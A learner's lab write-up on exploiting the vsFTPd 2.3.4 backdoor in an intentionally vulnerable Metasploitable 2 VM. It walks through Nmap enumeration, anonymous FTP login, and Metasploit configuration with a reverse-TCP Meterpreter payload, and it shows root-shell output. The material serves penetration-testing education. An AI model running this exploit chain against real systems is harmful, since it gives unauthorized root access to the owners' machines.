# Metasploitable 2 — FTP Enumeration & vsFTPd 2.3.4 Exploitation

## Lab Overview

This is my first exploitation lab using **Metasploitable 2**. The target is an intentionally vulnerable virtual machine, and I used my Kali Linux machine as the attacker.

The main goal of this lab was to:

1. Discover the target and its exposed services.
2. Identify the FTP service and its version.
3. Test anonymous FTP access manually.
4. Search for a matching Metasploit exploit.
5. Configure and run the exploit.
6. Obtain a Meterpreter session.
7. Open a normal Linux shell.
8. Verify that the obtained access was **root**.
9. Collect basic information about the compromised system.

> **Lab safety:** This activity was performed against my own intentionally vulnerable Metasploitable 2 VM. The same techniques should only be used on systems where I have explicit authorization.

---

# 1. Identify the Target with Nmap

I started with an aggressive Nmap scan using service/version detection:

```bash
nmap -sV -A 10.192.62.117
```

### Options used

- `-sV` → Detect service versions.
- `-A` → Enable OS detection, version detection, default scripts, and traceroute.

The target was:

```text
10.192.62.117
```

Nmap reported that the host was up:

```text
Host is up (0.00027s latency).
```

It also reported:

```text
MAC Address: 08:00:27:18:5E:D0 (Oracle VirtualBox virtual NIC)
```

This confirmed that the target was a VirtualBox VM.

---

# 2. Important Services Found by Nmap

The scan showed many open ports.

Some of the most interesting results were:

```text
21/tcp    open  ftp       vsftpd 2.3.4
22/tcp    open  ssh       OpenSSH 4.7p1
23/tcp    open  telnet    Linux telnetd
25/tcp    open  smtp      Postfix smtpd
53/tcp    open  domain    ISC BIND 9.4.2
80/tcp    open  http      Apache httpd 2.2.8
111/tcp   open  rpcbind   2
139/tcp   open  netbios   Samba
445/tcp   open  netbios   Samba 3.0.20-Debian
1524/tcp  open  bindshell Metasploitable root shell
2049/tcp  open  nfs       2-4
2121/tcp  open  ftp       ProFTPD 1.3.1
3306/tcp  open  mysql     MySQL 5.0.51a
5432/tcp  open  postgres  PostgreSQL 8.3.x
5900/tcp  open  vnc       VNC 3.3
6667/tcp  open  irc       UnrealIRCd
8009/tcp  open  ajp13     Apache Jserv
8180/tcp  open  http      Apache Tomcat 5.5
```

The service that I decided to investigate first was:

```text
21/tcp open ftp vsftpd 2.3.4
```

Nmap also reported:

```text
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

This was an important finding because it suggested that I could access the FTP service without a normal username/password account.

---

# 3. Manually Test the FTP Service

Instead of immediately launching an exploit, I manually verified the FTP finding.

I connected to port 21 using:

```bash
ftp 10.192.62.117
```

The server responded:

```text
Connected to 10.192.62.117.
220 (vsFTPd 2.3.4)
```

The FTP banner confirmed that the service was running:

```text
vsFTPd 2.3.4
```

The client then asked for a username:

```text
Name (10.192.62.117:kali):
```

I entered:

```text
anonymous
```

The server replied:

```text
331 Please specify the password.
```

I entered the anonymous FTP password.

The server then returned:

```text
230 Login successful.
```

This confirmed that **anonymous FTP login actually worked**.

This was important because Nmap had reported the possibility, and I now verified it manually.

---

# 4. Check the FTP Directory

After logging in, the FTP client displayed:

```text
Remote system type is UNIX.
Using binary mode to transfer files.
```

I ran:

```text
ftp> ls
```

The server responded:

```text
229 Entering Extended Passive Mode (|||12331|).
150 Here comes the directory listing.
226 Directory send OK.
```

The directory listing did not show any obvious files.

I then checked the current FTP directory:

```text
ftp> pwd
```

The result was:

```text
Remote directory: /
```

So the anonymous FTP account was currently located at `/`, as exposed by the FTP service.

---

# 5. Mistake: Using `id` Inside FTP

While still inside the FTP client, I tried:

```text
ftp> id
```

The server responded:

```text
550 Permission denied.
```

### Why this happened

I initially tried to use `id` to find out which Linux user I was running as.

However, I was still inside the **FTP client**, not a Linux shell.

`id` is a Linux command, while the FTP client accepts FTP commands.

For example:

```text
ftp> pwd
ftp> ls
ftp> bye
```

are FTP client commands.

A command such as:

```bash
id
```

belongs to the Linux shell.

This was a useful distinction to learn.

---

# 6. Exit the FTP Client

I left the FTP session and returned to Metasploit.

The important point from the FTP stage was:

```text
FTP service: vsFTPd 2.3.4
Anonymous login: Successful
Current FTP directory: /
```

At this point I had both:

- A confirmed service/version.
- A confirmed anonymous FTP login.

The version `vsFTPd 2.3.4` was also interesting because this version is associated with a known backdoor vulnerability used in Metasploitable 2.

---

# 7. Start Metasploit

I launched Metasploit Framework:

```bash
msfconsole
```

Once Metasploit started, I searched for an exploit related to the discovered FTP version:

```text
msf > search vsftpd 2.3.4
```

Metasploit returned:

```text
Matching Modules
================

#  Name                                  Disclosure Date  Rank       Check  Description
0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution
```

This was a direct match for the service I had discovered.

---

# 8. Select the Exploit

Instead of typing the complete module path, I selected module number `0`:

```text
msf > use 0
```

Metasploit responded:

```text
[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
```

The prompt changed to:

```text
msf exploit(unix/ftp/vsftpd_234_backdoor) >
```

This showed that I was now working inside the vsFTPd 2.3.4 backdoor exploit module.

---

# 9. Check the Exploit Options

I ran:

```text
show options
```

The module required:

```text
RHOSTS
```

and had:

```text
RPORT 21
```

The important settings were:

```text
RHOSTS    [empty]    required
RPORT     21         required
```

The selected payload was:

```text
cmd/linux/http/x86/meterpreter_reverse_tcp
```

The payload also required:

```text
LHOST
LPORT 4444
```

---

# 10. Understand RHOSTS and LHOST

Before configuring the exploit, I needed to understand the difference between the two IP addresses.

My machines were:

```text
Kali Linux
10.192.62.204
```

and:

```text
Metasploitable 2
10.192.62.117
```

Therefore:

```text
RHOSTS = 10.192.62.117
LHOST  = 10.192.62.204
```

### RHOSTS

`RHOSTS` means **Remote Hosts**.

It is the target machine that Metasploit will attack.

```text
RHOSTS = Metasploitable 2
```

### LHOST

`LHOST` means **Local Host**.

For a reverse payload, this is the Kali machine that waits for the target to connect back.

```text
LHOST = Kali Linux
```

The basic idea is:

```text
Kali Linux                         Metasploitable 2
10.192.62.204                      10.192.62.117
       │                                  │
       │       exploit FTP service        │
       ├─────────────────────────────────>
       │                                  │
       │       reverse connection         │
       <─────────────────────────────────┤
       │                                  │
       └──── Meterpreter session ─────────┘
```

---

# 11. Set RHOST

I configured the target IP:

```text
set rhost 10.192.62.117
```

Metasploit displayed:

```text
rhost => 10.192.62.117
```

Metasploit normalized this into the module's `RHOSTS` setting.

---

# 12. Set LHOST

I then configured my Kali IP:

```text
set lhost 10.192.62.204
```

Metasploit displayed:

```text
lhost => 10.192.62.204
```

I then ran:

```text
show options
```

to verify the configuration.

The important settings were now:

```text
RHOSTS = 10.192.62.117
RPORT  = 21

LHOST  = 10.192.62.204
LPORT  = 4444
```

The payload was still:

```text
cmd/linux/http/x86/meterpreter_reverse_tcp
```

---

# 13. Run the Exploit

I executed:

```text
exploit
```

Metasploit started a reverse TCP handler:

```text
[*] Started reverse TCP handler on 10.192.62.204:4444
```

It then automatically checked the target:

```text
[*] 10.192.62.117:21 - Running automatic check ("set AutoCheck false" to disable)
```

Metasploit detected the FTP banner:

```text
[*] 10.192.62.117:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
```

It then reported:

```text
[+] 10.192.62.117:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
```

Then:

```text
[+] 10.192.62.117:21 - Backdoor has been spawned!
```

Finally:

```text
[*] Meterpreter session 1 opened
```

The connection was shown as:

```text
10.192.62.204:4444 -> 10.192.62.117:52988
```

I had successfully obtained:

```text
meterpreter >
```

This confirmed that the exploit successfully resulted in an interactive Meterpreter session.

---

# 14. Open a Normal Linux Shell

Inside Meterpreter, I entered:

```text
meterpreter > shell
```

Metasploit responded:

```text
Process 4900 created.
Channel 1 created.
```

This opened a normal command shell on the target.

The difference was:

```text
meterpreter >
```

is the Meterpreter interface, while the shell created by:

```text
shell
```

allows normal Linux commands to be executed on the target.

---

# 15. Verify the Compromised User

Inside the Linux shell, I ran:

```bash
whoami
```

The result was:

```text
root
```

This was the first confirmation that the session had root-level privileges.

I then ran:

```bash
id
```

The result was:

```text
uid=0(root) gid=0(root)
```

On Linux, UID `0` represents the root account.

Therefore:

```text
whoami → root
uid=0  → root
```

confirmed that the exploited service had given me root-level access.

---

# 16. Check the Current Directory

I ran:

```bash
pwd
```

The result was:

```text
/
```

So the shell's current working directory was the filesystem root.

I then ran:

```bash
ls
```

The target returned:

```text
bin
boot
cdrom
dev
eAsVCgYRv
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tEJvkyBO
tmp
usr
var
vmlinuz
```

This showed the top-level filesystem directories and files.

I then exited the Linux shell:

```bash
exit
```

and returned to:

```text
meterpreter >
```

---

# 17. Verify the User Again from Meterpreter

Back in Meterpreter, I ran:

```text
getuid
```

The result was:

```text
Server username: root
```

This independently confirmed the root-level access.

So I had:

```text
Linux shell:
whoami
→ root

Linux shell:
id
→ uid=0(root) gid=0(root)

Meterpreter:
getuid
→ Server username: root
```

---

# 18. Collect System Information

I then ran:

```text
sysinfo
```

Metasploit returned:

```text
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```

This gave me basic information about the compromised machine.

Important details:

- **Hostname:** `metasploitable.localdomain`
- **OS:** Ubuntu 8.04
- **Kernel:** Linux 2.6.24-16-server
- **Architecture:** i686 / 32-bit
- **Meterpreter:** x86/Linux

---

# 19. Final `pwd` in Meterpreter

The last command I ran was:

```text
meterpreter > pwd
```

The result was:

```text
/
```

So Meterpreter also reported the current working directory as:

```text
/
```

This was the final command in this stage of the lab.

---

# Attack Chain Summary

The complete process I followed was:

```text
Nmap scan
    ↓
Found FTP on port 21
    ↓
Identified vsFTPd 2.3.4
    ↓
Nmap reported anonymous FTP access
    ↓
Manually connected using FTP
    ↓
Anonymous login succeeded
    ↓
Confirmed FTP directory with pwd
    ↓
Exited FTP
    ↓
Started Metasploit
    ↓
Searched for vsFTPd 2.3.4
    ↓
Found vsftpd_234_backdoor
    ↓
Selected the exploit
    ↓
Configured RHOSTS = 10.192.62.117
    ↓
Configured LHOST = 10.192.62.204
    ↓
Ran exploit
    ↓
Backdoor spawned
    ↓
Meterpreter session opened
    ↓
Opened Linux shell
    ↓
whoami → root
    ↓
id → uid=0(root)
    ↓
Exited Linux shell
    ↓
getuid → root
    ↓
sysinfo
    ↓
pwd → /
```

---

# Key Learning Points

## 1. Enumeration comes before exploitation

The first important step wasn't Metasploit.

It was discovering:

```text
21/tcp open ftp vsftpd 2.3.4
```

The Nmap scan gave me information about what was running on the target.

---

## 2. Verify findings manually

Nmap reported:

```text
Anonymous FTP login allowed
```

I manually verified it with:

```bash
ftp 10.192.62.117
```

and:

```text
anonymous
```

The server responded:

```text
230 Login successful.
```

This confirmed the finding.

---

## 3. Version information can lead to vulnerability research

The FTP banner showed:

```text
vsFTPd 2.3.4
```

I used that information to search Metasploit:

```text
search vsftpd 2.3.4
```

which found:

```text
exploit/unix/ftp/vsftpd_234_backdoor
```

---

## 4. RHOSTS and LHOST are different

This was an important concept for me.

```text
RHOSTS → target
LHOST  → my Kali machine
```

In this lab:

```text
RHOSTS = 10.192.62.117
LHOST  = 10.192.62.204
```

---

## 5. Meterpreter and Linux shell are different

Meterpreter provides its own command interface:

```text
meterpreter >
```

Using:

```text
shell
```

opened a normal shell on the target.

That allowed me to run Linux commands such as:

```bash
whoami
id
pwd
ls
```

---

## 6. Always verify privileges after exploitation

Getting a session does not automatically tell me what privileges I have.

I verified it using:

```bash
whoami
id
```

and:

```text
getuid
```

All three confirmed:

```text
root
```

Therefore the exploitation resulted in **root-level access**.

---

# Mistake I Made

### Mistake: Running `id` inside the FTP client

I initially did:

```text
ftp> id
```

This was incorrect because I was still interacting with the FTP client.

The correct idea is:

```text
FTP client
→ use FTP commands

Linux shell
→ use Linux commands
```

For example:

```text
ftp> pwd
ftp> ls
ftp> bye
```

versus:

```bash
whoami
id
pwd
ls
```

inside the Linux shell.

This helped me understand the difference between a service-specific client and an operating-system shell.

---

# Evidence of Successful Exploitation

The strongest evidence from this lab was:

```text
[+] Backdoor has been spawned!
[*] Meterpreter session 1 opened
```

followed by:

```text
whoami
root
```

and:

```text
id
uid=0(root) gid=0(root)
```

and finally:

```text
meterpreter > getuid
Server username: root
```

Therefore, the lab resulted in a confirmed **root-level compromise of the intentionally vulnerable Metasploitable 2 VM**.

---

# Commands Used

For reference, these were the main commands I used during the lab:

### Nmap

```bash
nmap -sV -A 10.192.62.117
```

### FTP

```bash
ftp 10.192.62.117
```

Inside FTP:

```text
anonymous
ls
pwd
id
```

`id` was a mistake because it was entered inside the FTP client.

### Metasploit

```bash
msfconsole
```

```text
search vsftpd 2.3.4
use 0
show options
set rhost 10.192.62.117
set lhost 10.192.62.204
show options
exploit
```

### Meterpreter

```text
shell
```

### Linux shell after exploitation

```bash
whoami
id
pwd
ls
exit
```

### Meterpreter verification

```text
getuid
sysinfo
pwd
```

---

# Result

**Target:** Metasploitable 2  
**Target IP:** `10.192.62.117`  
**Attacker:** Kali Linux  
**Attacker IP:** `10.192.62.204`  
**Service:** FTP  
**Port:** `21/tcp`  
**Version:** vsFTPd 2.3.4  
**Exploit:** `exploit/unix/ftp/vsftpd_234_backdoor`  
**Session:** Meterpreter  
**Final privilege:** `root`

The main thing I learned from this exercise was not just how to run a Metasploit exploit. I learned the flow of a basic penetration test:

**Reconnaissance → Enumeration → Verification → Vulnerability identification → Exploitation → Session → Privilege verification → Documentation**
